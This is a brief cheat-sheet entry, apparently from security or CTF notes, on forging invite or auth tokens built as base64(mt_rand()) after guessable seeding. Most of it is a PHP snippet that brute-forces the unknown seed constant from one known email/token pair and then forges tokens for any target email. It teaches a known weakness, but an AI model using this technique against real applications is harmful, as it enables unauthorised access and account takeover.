# Predictable PHP mt_rand() Seed Brute Force

If a token/invite-code is `base64(mt_rand())` after `mt_srand()` is seeded from guessable inputs (an email + a small unknown constant), brute-force the unknown part offline against one known (input, output) pair, then regenerate a valid token for any other input.

```php
// replay the same seeding logic locally, try every candidate constant:
for ($c = 0; $c < 1000000; $c++) {
    mt_srand(calculate_seed($known_email, $c));
    if (base64_encode(mt_rand()) === $known_token) { $constant = $c; break; }
}
// once found, forge for any target:
mt_srand(calculate_seed($target_email, $constant));
$forged_token = base64_encode(mt_rand());
```
